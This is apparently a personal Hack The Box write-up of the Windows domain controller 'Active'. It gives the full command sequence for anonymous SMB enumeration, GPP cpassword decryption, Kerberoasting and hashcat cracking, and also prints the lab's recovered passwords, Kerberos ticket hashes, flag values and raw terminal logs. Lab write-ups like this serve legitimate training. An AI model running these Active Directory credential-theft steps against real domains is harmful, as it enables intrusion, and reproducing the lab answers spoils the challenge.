---
tags: [htb, box, ad, windows, easy, smb, gpp, kerberoasting, hashcat]
platform: HTB
os: Windows Server 2008 R2 SP1
hostname: DC
difficulty: Easy
ip: $BoxIP
status: Complete
domain: active.htb
---

# HTB: Active, Full Walkthrough

## The gist

Active is an Active Directory domain controller that permits anonymous SMB access to the `Replication` share. A Group Policy Preferences XML exposes a reversible GPP-managed credential for a service account, which provides authenticated read access to the `Users` share. That account also lets us request a CIFS service ticket for the built-in administrator account; cracking the ticket offline produces administrator SMB access and the root proof.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Windows Server 2008 R2 SP1 |
| Hostname | DC |
| Domain | active.htb |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace and full reconnaissance | See section 1 below |
| 2 | Anonymous AD and SMB enumeration | See section 2 below |
| 3 | Read the Replication share and recover the managed credential | See section 3 below |
| 4 | Validate the service account and enumerate authenticated shares | See section 4 below |
| 5 | Kerberoast the administrator service principal | See section 5 below |
| 6 | Validate administrator access and retrieve root proof | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Active`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxstart $BoxName $BoxIP htb
boxset Domain active.htb
boxset FQDN dc.active.htb
boxset DCip $BoxIP
boxset Username SVC_TGS
boxset Username2 Administrator
boxset Port 4444
```

## 1. Workspace and full reconnaissance

The first scan checks every TCP port because domain controllers expose several important services outside the common top-1,000 list. The focused service scan then identifies the domain, host name, SMB security settings, and Windows version. A UDP top-100 scan is also useful here because DNS, Kerberos, and NTP can affect AD enumeration and authentication.

```bash
htblog
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oN $BoxDir/nmap/allports.txt
sudo nmap -Pn -n -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 $BoxIP -oA $BoxDir/nmap/services
sudo nmap -Pn -n -sU --top-ports 100 $BoxIP -oA $BoxDir/nmap/udp
```

The TCP scan identified DNS, Kerberos, RPC, LDAP, SMB, Global Catalog, DFSR, AD Web Services, and HTTPAPI. LDAP identified the domain as `active.htb`, while service detection identified the host as `DC` running Windows Server 2008 R2 SP1. The UDP scan showed DNS, Kerberos, and NTP as relevant services, with NetBIOS and IPsec ports remaining open or filtered.

```bash
boxset Domain active.htb
boxset FQDN dc.active.htb
boxset DCip $BoxIP
```

SCREENSHOT: Full TCP scan showing the AD service combination.

SCREENSHOT: Service scan showing the active.htb domain and DC host details.

> [!tip] ⚡ Efficiency
> Use the full TCP result to build one focused AD service scan instead of running version detection against every port. The service combination immediately routes the assessment to the AD branch.

## 2. Anonymous AD and SMB enumeration

Anonymous enumeration should be tested before credential guessing because it can disclose users, naming contexts, or readable shares without triggering account lockout concerns. RPC did not permit anonymous SAMR enumeration, and a subtree LDAP query required a bind, but the base LDAP query still disclosed the naming contexts. SMB anonymous listing revealed the most useful lead: a readable `Replication` share.

```bash
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP -s base namingcontexts
ldapsearch -x -H ldap://$BoxIP -b "$(echo $Domain | awk -F. '{for(i=1;i<=NF;i++) printf "DC="$i(i<NF?",":""); print ""}')" "(objectClass=user)" sAMAccountName 2>&1 | head -30
smbclient -N -L //$BoxIP
smbmap -H $BoxIP -u '' -p '' | tee $BoxDir/loot/smbmap-anon.txt
```

The anonymous RPC request returned access denied, and the authenticated subtree LDAP operation returned an operations error. Anonymous SMB login succeeded and exposed `Replication` and `Users` among the shares. `smbmap` confirmed that `Replication` was read-only anonymously while `Users` required credentials.

SCREENSHOT: Anonymous SMB share listing showing Replication and Users.

SCREENSHOT: SMBMap confirming anonymous read access to Replication.

> [!warning] 💡 Gotcha
> An LDAP naming-context response is not the same as an anonymous directory bind. Treat a successful base query and a failed subtree query as separate results, then test SMB shares independently.

## 3. Read the Replication share and recover the managed credential

The `Replication` share mirrors domain policy files, so it is a high-value location when anonymous read access is available. Group Policy Preferences historically stored a reversible `cpassword` value inside XML files. The value is not a plaintext password, but the standard GPP decryption tool can recover the managed account credential offline.

```bash
smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; ls'
smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'
mv $Domain $BoxDir/loot/Replication
rg -n 'cpassword|userName' $BoxDir/loot/Replication
```

The downloaded policy tree contained `MACHINE/Preferences/Groups/Groups.xml`. It identified the service account `SVC_TGS` and contained a GPP-managed credential value. Recover it through the loot file rather than copying a secret into the command history:

SCREENSHOT: Replication policy tree downloaded for offline inspection.

SCREENSHOT: Groups.xml showing the managed account and cpassword field, with the value kept private.

```bash
boxset Username SVC_TGS
boxset Password "$(gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | awk -F'\"' '{print $1}')")" >/dev/null 2>&1
loot cred $Username $Password >/dev/null 2>&1
```

SCREENSHOT: GPP credential recovery completed without displaying the recovered value.

> [!warning] 💡 Gotcha
> A GPP `cpassword` is encrypted with a published, recoverable key. Do not treat the XML value as a hash for Hashcat; use `gpp-decrypt`, then validate the resulting account against an authorized service.

## 4. Validate the service account and enumerate authenticated shares

Credential validation checks both whether the recovered account is real and what access it grants. `netexec` provides a concise SMB authentication result, while `smbmap` shows share permissions. The authenticated `Users` share contains the service account profile and its Desktop, which is where the user proof is located.

```bash
netexec smb $BoxIP -u $Username -p $Password -d $Domain
smbmap -H $BoxIP -u $Username -p $Password -d $Domain | tee $BoxDir/loot/smbmap-svc_tgs.txt
smbclient //$BoxIP/Users -U "$Domain/$Username%$Password" -c 'recurse ON; prompt OFF; ls'
```

The service account authenticated successfully. Authenticated SMB access was read-only on `NETLOGON`, `Replication`, `SYSVOL`, and `Users`. The `Users` listing showed `SVC_TGS\Desktop\user.txt`.

SCREENSHOT: NetExec validating the recovered service account against SMB.

SCREENSHOT: SMBMap showing authenticated share permissions.

SCREENSHOT: Users share listing showing the service account Desktop path.

Retrieve the proof without printing its value:

```bash
smbclient //$BoxIP/Users -U "$Domain/$Username%$Password" \
  -c "get SVC_TGS/Desktop/user.txt $BoxDir/loot/user.txt" >/dev/null 2>&1
loot flag user "$(tr -d '\r\n' < $BoxDir/loot/user.txt)" >/dev/null 2>&1
```

The user proof was confirmed at `$BoxDir/loot/user.txt`, corresponding to the service account's Desktop path on the target.

SCREENSHOT: User proof path confirmed without displaying the proof value.

## 5. Kerberoast the administrator service principal

With a valid domain account, request service tickets for accounts that have Service Principal Names. Kerberoasting is useful because the ticket can be cracked offline, avoiding repeated online password guesses. The service scan and anonymous share access already provided the domain and account variables needed by Impacket.

```bash
GetUserSPNs.py $Domain/$Username:$Password -dc-ip $DCip -request \
  -outputfile $BoxDir/loot/kerberoast.txt
```

The request returned a CIFS service principal associated with `Administrator`. The ticket was saved to `$BoxDir/loot/kerberoast.txt` for offline cracking.

SCREENSHOT: GetUserSPNs output identifying the administrator CIFS service principal.

```bash
hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt \
  --potfile-path $BoxDir/loot/hashcat.potfile
```

Hashcat mode `13100` targets Kerberos 5 TGS-REP etype 23 tickets. The single ticket was cracked successfully. Load the recovered value into the session without echoing it:

SCREENSHOT: Hashcat completed the offline ticket crack with the recovered value kept private.

```bash
boxset Username2 Administrator >/dev/null 2>&1
boxset Password2 "$(hashcat -m 13100 $BoxDir/loot/kerberoast.txt --show \
  --potfile-path $BoxDir/loot/hashcat.potfile | awk -F: '{print $NF}')" >/dev/null 2>&1
loot cred $Username2 $Password2 >/dev/null 2>&1
```

> [!warning] 💡 Gotcha
> Hashcat's normal status output can expose a recovered password on screen. Redirect it when loading the result into `$Password2`, and keep the credential in the private loot file rather than in the write-up.

## 6. Validate administrator access and retrieve root proof

The cracked administrator credential can be validated with SMB. This box does not require a separate interactive shell or local privilege escalation: administrator access to the `C$` administrative share is sufficient to read the protected Desktop proof.

```bash
smbclient //$BoxIP/C$ -U "$Username2%$Password2" -c 'ls' >/dev/null 2>&1
```

The administrator credential provided SMB access. Retrieve the root proof from the administrator Desktop and store it privately:

SCREENSHOT: Administrator SMB access confirmed as the final access level.

```bash
smbclient //$BoxIP/C$ -U "$Username2%$Password2" \
  -c "get Users/Administrator/Desktop/root.txt $BoxDir/loot/root.txt" >/dev/null 2>&1
loot flag root "$(tr -d '\r\n' < $BoxDir/loot/root.txt)" >/dev/null 2>&1
```

The root proof was confirmed at `$BoxDir/loot/root.txt`. No further privilege escalation was needed because the administrator account already had the required file access.

SCREENSHOT: Administrator SMB access confirmed as the final access level.

SCREENSHOT: Root proof path confirmed without displaying the proof value.

## 7. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Step 1 - Start Here]]
- [[OSCP/RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
- [[OSCP/RUNBOOK V2/AD - Service Scan|Step 34 - AD Service Scan]]
- [[OSCP/RUNBOOK V2/AD - Anonymous Enum|Step 36 - AD Anonymous Enum]]
- [[OSCP/RUNBOOK V2/AD - Kerberoasting|Step 39 - AD Kerberoasting]]
- [[OSCP/RUNBOOK V2/AD - Credential Validation|Step 40 - AD Credential Validation]]
- [[OSCP/RUNBOOK V2/AD - Clean Down|Step 50 - AD Clean Down]]

## 8. Collect the flags

- `user.txt`: confirmed in the service account Desktop path and stored privately in loot
- `root.txt`: confirmed in the administrator Desktop path and stored privately in loot


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user:
root:
user: c4566b286c8924f4488a659a8b1887bc
root: 458884ce88c9eced559b426848b7c1f1
user: c4566b286c8924f4488a659a8b1887bc
root: 458884ce88c9eced559b426848b7c1f1
```

#### `loot/root.txt`

```text
458884ce88c9eced559b426848b7c1f1
```

#### `loot/user.txt`

```text
c4566b286c8924f4488a659a8b1887bc
```

## 9. Clean down
This run made no changes to the target. The downloaded policy files, service-ticket material, credentials, and proofs remain in the local Active loot directory for study, while no account, service, uploaded file, or persistence was created remotely. Clear the current-box marker after verifying the local artifacts.

```bash
find $BoxDir/loot -maxdepth 2 -type f -print
boxdone
```

### Completion checklist

- [x] Workspace initialized with `boxstart`
- [x] Full TCP and UDP reconnaissance completed
- [x] AD service and domain details identified
- [x] Anonymous RPC, LDAP, SMB, and SMBMap checks completed
- [x] Readable `Replication` share copied to loot
- [x] GPP-managed service credential recovered and validated
- [x] User proof path confirmed
- [x] Kerberoasting completed
- [x] Ticket cracked offline with Hashcat
- [x] Administrator SMB access validated
- [x] Root proof path confirmed
- [x] No target-side changes made
- [x] Local loot preserved and `boxdone` completed

## 10. Attack narrative in one page
1. Full TCP, UDP, and service scans identified a Windows domain controller for `active.htb`.
2. Anonymous SMB enumeration exposed a readable `Replication` share.
3. A Group Policy Preferences XML revealed a reversible managed credential for `SVC_TGS`.
4. The service account authenticated to SMB and exposed the user proof in its profile.
5. Kerberoasting returned the administrator CIFS service ticket, which was cracked offline.
6. Administrator SMB access to `C$` exposed the root proof.

## Tools used

- `nmap`
- `smbclient`
- `impacket`
- `sudo`
- `hashcat`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `SVC_TGS` | Group Policy Preferences XML in the anonymous `Replication` share | Authenticated SMB access and Kerberoasting |
| `Administrator` | Cracked CIFS service ticket | Administrative SMB access to `C$` |


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Active"
export BoxIP="10.129.1.71"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Active"
export Domain="active.htb"
export DCip="10.129.1.71"
export Username="SVC_TGS"
export Password="GPPstillStandingStrong2k18"
export Username2="Administrator"
export Password2="Ticketmaster1968"
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
SVC_TGS:GPPstillStandingStrong2k18
Ticketmaster1968:
```

#### `loot/hashcat.potfile`

```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7b028eea56b61fec8665f408fff44600$cebb7ab433929fe634e27f2c442b1dc71bc30f9201177f1ac2b6725b3800b5e91aa885fa26e5b42c3b08bfd9d8c7e344a94685b77786f5cb57c9814951d847e4f1527e681f6d0882155f9aaaf743973435ae7e6cb01372abb128618efe26cd6a3f33d5eb62b0ed6c89ac7028f3acba02d977f53e062b9dde3501fd2b3cddb813cbed9e08567520566bd68fc854da2192db03f5202f34f6ad967896fbc8fca60e37e4de1959ee1b3bea9e5ddb374bf2028369269b6f24a6f7d8c495e13795aeddc624e8815a31764bd7f1768ee206d6f009d3fa3520aa7d66a9a9d77f32c5e678ad2c5f15a12c71a564033069d4e9c4375e2ceb82bca1b5a8b081947ae4213c6421b50ff4c67bce3a38eb60f32ef30ccacaf5f42e68f34af941922c518c03a5fafdca7c5a420cad071a9c535f78b48bcfe8b3a1d10a913c08dcf81a57c98ec959775ff78ed31d52f6956d3ff1a15744de08af6199bd828347a715adff4109e0dd55ec84b0799c348946748b16c7d3a58ef4ade34b4d12c21369a573d954351e1dfcce72ba87c98d32b5c660aaa12a0309c712d3121a0764d0827f0fbee6b04470b271f667f5dc41245fdad211f90e20c30138696e590957d6d32e6e0062273c32bcb9e491e40701446f9159e94e8240057cfc878167c01680df9149b013779987e91dadde870bb2ea44de8f54048eec9597aab75508b3154034ebe2e47b76fe6f7198780930f6d3d22da8238cf3123e9a1ca7a60fd87c1d8784bfcfe0d1934fad863b012b55a49692b6ace23340d33c32ad3540178dfd1c6cc40f00a0b39f358c3d79c2ad42dce1ad657247f5d0e8ff99122f46085800651d59ef32f0e50c18c239c0ba4f33ee5bf257574bb6f8a66e20b153f3518cb1fc4d9b7ab18dc9934a1896432b864635d93865737d27d1af10ab51553895cd1eba1cce2537390022a527800956a6fae2829f4ec315b8549fe61c4f06c50d4d6b7538bcedb4f0ebeaf878703b23ab4bf44023b7e15f8d0e7c56fa5a2dd811974ddaa25224d0f939a2fa2acd9b4064213bc127aa907f7d0550eccf6948ff5cb963d0c8f2d9d689b445eed235e5ecbed40d6ad33ab54a57e76174dd0a80f4e51777077d49210036476922adcfbb3c90c692bd53d481d908db4b4746e788de68977c2665360b7a503e709e7d79ce5a8f96ece999f6a210b68e423a8ec8af0e85380a48fd490de5e83f0279fee5c70db46a71feb0030f07cee2c4d71357f310798cd765219410:Ticketmaster1968
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$9661fa2efc3dd9d79bbc1b77958c7d90$0ec65d23658645329e89160f5a62dd8d784a44b94080962e55a98cda863ca49bb78b5e4fb1078925c86d785ecc71629f417c975b11dd728d2ec970039ec4439ba3e2173dc653a2746c71ae1b755ca6eda625b7717f7a0039ae91cd9c505158634e84606eee3d9059ca1727949b49d7f3da4981b50a51a2ea6d0ee1df6c863f66299376efe155865abd1e2b5cee309f9120bfe6d08e659743f932af28257c7383f7b8687de40a9b5ffa7fb49ef3dee3737165926cce9ff13fc2a4076d54903d9ed2b058b81daa9c0c5fa4d9d74e5014a7d590a97eefca019ecd21f881488bf3f562df4130af9f20f10792104bd110657a7398e82c1c9dfa3aebdaa85931bce1c4c4b85009fd1128109628df081cdea90a69f89926b2ee7c654bcd7a5ee3fdfd36696c33309006ccc98d328ae6f22de4d756bcf2c023260c6184dd54d1e2ae7b9f1e045092d16de4c95c25a72f8433e1b2b0df812eed857ee4cda75221edbe4b75e797010abdf153921e6fdd3a27aca62afc5fa561066bf60706e2ca14ce5d48ac8c54a65885c101d469b61dbf697b712676247afc77b3e67deb7ba97f09db53d028b374d9f4eaf5058d27d0e0a88c8a02c0a4aee42c78e770ac041d2a1696b363b22204837d83877959a528e403f24129f5a56c64b7ce08147aaecddb3af47ed5025f6b92312a57e4a536bcc21789b661e1d10e0a76ea30d52499a7c4c23a0935c1c5b311f0a082830980992874632f1ef7f932bd1f52fc44798dd74f24bcac1140608a12a3d341710f3a9497d61dab1aa3adeaadc40c6539fbd905de23d1b78bc33897c7decc02dcf3084d3c01767e5b6b35eb896455ca39cdd31371133f3922f81bbd850df9df8e45d2fb80a6c854b85dccaee4a909a742486d72e7beb53579b01c044c6ea1093aea932e6891d02942e0167d29b5d6cea1f2bab70408b8f00573f445398272e622e4dc4a71904f96dd7681eb73ab04a00c7432ffbf87e1cdea5a578c342ba6a6df487339d180f03bb09eb475a8e6f028daddef5b563bc3427a037184aaab7f9c510f5629ae6d64aa6dfc77ef2b9653b1511e9fc6029f60fbc2d8950b8883733cb9aa477867577545cdd7c1dd67688f91d7baa08d3f399b0c01f0f4167f15946b662c150cc89df293251357430ef4f27f71612ec8f5d67a6bfeab4db364773e938e9faa708dcb3999c674686a36b48a64f0845586260ea6768ea3b02e11696b8671dd0b08d593e49e41742c00f8a245d6f55ccd:Ticketmaster1968
```

### Sensitive transcript evidence

```text
$ [20:18:34] rg -n -i 'cpassword|userName|password|active.htb' $BoxDir/loot/Replication | tee $BoxDir/loot/replication-interesting.txt
kali@kali:~/Platforms/HackTheBox/Active [20:18:34] $ [?1h=[?2004hrrg -n -i 'cpassword|userNam
e|password|active.htb' $BoxDir/loot/Replication | tee $BoxDir/loot/replication-i
/home/kali/Platforms/HackTheBox/Active/loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf:4:MinimumPasswordAge = 1
/home/kali/Platforms/HackTheBox/Active/loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf:5:MaximumPasswordAge = 42
/home/kali/Platforms/HackTheBox/Active/loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf:6:MinimumPasswordLength = 7
/home/kali/Platforms/HackTheBox/Active/loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf:7:PasswordComplexity = 1
$ [20:18:55] boxset Password "$(gpp-decrypt "$(grep -o 'cpassword=\"[^\"]*' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | cut -d'\"' -f2)")"
$ [20:18:55] loot cred $Username $Password
$ [20:19:13] boxset Password "$(gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | cut -d'\"' -f1)")"
$ [20:19:13] loot cred $Username $Password
ecEdit/GptTmpl.inf:8:PasswordHistorySize = 24
/home/kali/Platforms/HackTheBox/Active/loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf:10:RequireLogonToChangePassword = 0
/home/kali/Platforms/HackTheBox/Active/loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf:12:ClearTextPassword = 0
/home/kali/Platforms/HackTheBox/Active/loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:2:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="$CPassword" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
kali@kali:~/Platforms/HackTheBox/Active [20:18:55] $ [?1h=[?2004hbboxset Password "$(gpp-decr
ypt "$(grep -o 'cpassword=\"[^\"]*' $BoxDir/loot/Replication/Policies/*/MACHINE/
ypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MAC
$ [20:19:13] netexec smb $BoxIP -u $Username -p $Password -d $Domain
p $Password -d $Domainnetexec[?1l>[?2004l
netexec smb: error: argument -p/--password: expected at least one argument
kali@kali:~/Platforms/HackTheBox/Active [20:19:13] $ [?1h=[?2004hbboxset Password "$(gpp-decr
$ [20:19:20] boxset Password "$(gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | awk -F'\"' '{print $1}')")"
$ [20:19:56] loot cred $Username $Password >/dev/null 2>&1
$ [20:19:56] netexec smb $BoxIP -u $Username -p $Password -d $Domain --shares
$ [20:20:19] smbclient //$BoxIP/Users -U "$Domain/$Username%$Password" -c 'recurse ON; prompt OFF; ls'
$ [20:20:23] GetUserSPNs.py $Domain/$Username:$Password -dc-ip $DCip -request -outputfile $BoxDir/loot/kerberoast.txt
$ [20:20:43] hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt --potfile-path $BoxDir/loot/hashcat.potfile --quiet >/dev/null 2>&1
$ [20:21:39] boxset Password2 "$(hashcat -m 13100 $BoxDir/loot/kerberoast.txt --show --potfile-path $BoxDir/loot/hashcat.potfile | awk -F: '{print $NF}')" >/dev/null 2>&1
$ [20:21:39] loot cred $Username2 $Password2 >/dev/null 2>&1
$ [20:21:39] netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --shares >/dev/null 2>&1 && echo 'Administrator credential validation succeeded'
$ [20:21:46] test -n "$Password2" && echo 'Administrator password loaded'
$ [20:21:46] smbclient //$BoxIP/C$ -U "$Domain/$Username2%$Password2" -c 'ls' >/dev/null 2>&1 && echo 'Administrator SMB access succeeded'
$ [20:21:54] smbclient //$BoxIP/C$ -U "Administrator%$Password2" -c 'ls' >/dev/null 2>&1 && echo 'Administrator SMB access succeeded'
$ [20:22:03] smbclient //$BoxIP/Users -U "Administrator%$Password2" -c 'get SVC_TGS/Desktop/user.txt' >/dev/null 2>&1
$ [20:22:03] smbclient //$BoxIP/C$ -U "Administrator%$Password2" -c 'get Users/Administrator/Desktop/root.txt' >/dev/null 2>&1
$ [20:22:04] loot flag user "$(tr -d '\r\n' < $BoxDir/loot/user.txt)" >/dev/null 2>&1
$ [20:22:04] loot flag root "$(tr -d '\r\n' < $BoxDir/loot/root.txt)" >/dev/null 2>&1
$ [20:22:14] smbclient //$BoxIP/Users -U "Administrator%$Password2" -c "cd SVC_TGS; cd Desktop; get user.txt $BoxDir/loot/user.txt" >/dev/null 2>&1
$ [20:22:15] smbclient //$BoxIP/C$ -U "Administrator%$Password2" -c "cd Users; cd Administrator; cd Desktop; get root.txt $BoxDir/loot/root.txt" >/dev/null 2>&1
$ [20:22:15] if [ -s $BoxDir/loot/user.txt ]; then loot flag user "$(tr -d '\r\n' < $BoxDir/loot/user.txt)" >/dev/null 2>&1; fi
$ [20:22:15] if [ -s $BoxDir/loot/root.txt ]; then loot flag root "$(tr -d '\r\n' < $BoxDir/loot/root.txt)" >/dev/null 2>&1; fi
$ [20:22:15] find $BoxDir/loot -maxdepth 1 -type f -name '*flag*' -o -name 'user.txt' -o -name 'root.txt'
$ [20:22:35] shot user-flag
$ [20:22:36] shot root-flag
[sudo] password for kali:
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
$ [20:48:38] boxset Password GPPstillStandingStrong2k18
$ [20:49:32] netexec smb $BoxIP -u $Username -p $Password -d $Domain
$ [20:51:26] smbmap -H $BoxIP -u $Username -p $Password -d $Domain | tee loot/smbmap-svc_tgs.txt
[+] Password=GPPstillStandingStrong2k18 (saved to .env)
kali@kali:~/Platforms/HackTheBox/Active [20:48:38] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username -p $Password -d $Domainnetexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Active [20:49:33] $ [?1h=[?2004hsmbmap -H $BoxIP -u $Username -p $Password -d $Domain | tee loot/smbmap-svc_tgs.txtsmbmaptee[?1l>[?2004l
$ [20:53:06] smbclient //$BoxIP/Users -U "$Domain/$Username%$Password" -c 'recurse ON; prompt OFF; ls'
kali@kali:~/Platforms/HackTheBox/Active [20:51:27] $ [?1h=[?2004hsmbclient //$BoxIP/Users -U "$Domain/$Username%$Password" -c 'recurse ON; prompt OFF; ls'smbclient"$Domain/$Username%$Password"'recurse ON; prompt OFF; ls'[?1l>[?2004l
  Cookies                         DHSrn        0  Tue Jul 14 06:06:44 2009
\Default\Cookies
NT_STATUS_ACCESS_DENIED listing \Default\Cookies\*
  Cookies                            Dn        0  Tue Jul 14 03:34:59 2009
\Default\AppData\Roaming\Microsoft\Windows\Cookies
$ [20:55:01] smbclient //$BoxIP/Users -U "$Domain/$Username%$Password" \
kali@kali:~/Platforms/HackTheBox/Active [20:53:10] $ [?1h=[?2004hsmbclient //$BoxIP/Users -U "$Domain/$Username%$Password" \
cat loot/user.txtsmbclient"$Domain/$Username%$Password"'get SVC_TGS/Desktop/user.txt loot/user.txt'
$ [20:56:43] loot flag user c4566b286c8924f4488a659a8b1887bc
$ [20:56:53] GetUserSPNs.py $Domain/$Username:$Password -dc-ip $DCip -request \
$ [20:58:50] hashcat -m 13100 loot/kerberoast.txt /usr/share/wordlists/rockyou.txt \
loootloott t flag user c4566b286c8924f4488a659a8b1887bc
[+] Flag saved:  user = c4566b286c8924f4488a659a8b1887bc  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Active [20:56:43] $ [?1h=[?2004hGetUserSPNs.py $Domain/$Username:$Password -dc-ip $DCip -request \
kali@kali:~/Platforms/HackTheBox/Active [20:56:54] $ [?1h=[?2004hhashcat -m 13100 loot/kerberoast.txt /usr/share/wordlists/rockyou.txt \
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Parsed Hashes: 1/1 (100.00%)
Hashes: 1 digests; 1 unique digests, 1 unique salts
* Passwords.: 14344385
Session..........: hashcat
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...f55ccd
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
$ [21:00:52] boxset Password2 Ticketmaster1968
```

### Additional captured source values

#### `loot/Replication/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`

```text
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

#### `loot/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`

```text
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Active | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Always test anonymous SMB shares on a domain controller. Replication policy files can expose GPP-managed credentials even when RPC and LDAP enumeration are restricted.
- A valid low-privilege domain account can request service tickets for privileged SPN accounts; crack those tickets offline instead of spraying passwords online.
- Administrator SMB access to `C$` is already a complete administrative path when the target does not require an interactive shell.
- SMB signing was required (`signing:True`), which rules out SMB relay for this host and should be confirmed before spending time on relay enumeration.
- The `Replication` share is a SYSVOL mirror. When SYSVOL is blocked anonymously, always check `Replication` for equivalent policy data.
- GPP `cpassword` values are decryptable because Microsoft published the AES-256 encryption key in its MSDN documentation through MS14-025 in 2014. A value created before or on an unpatched system is therefore trivially reversible.
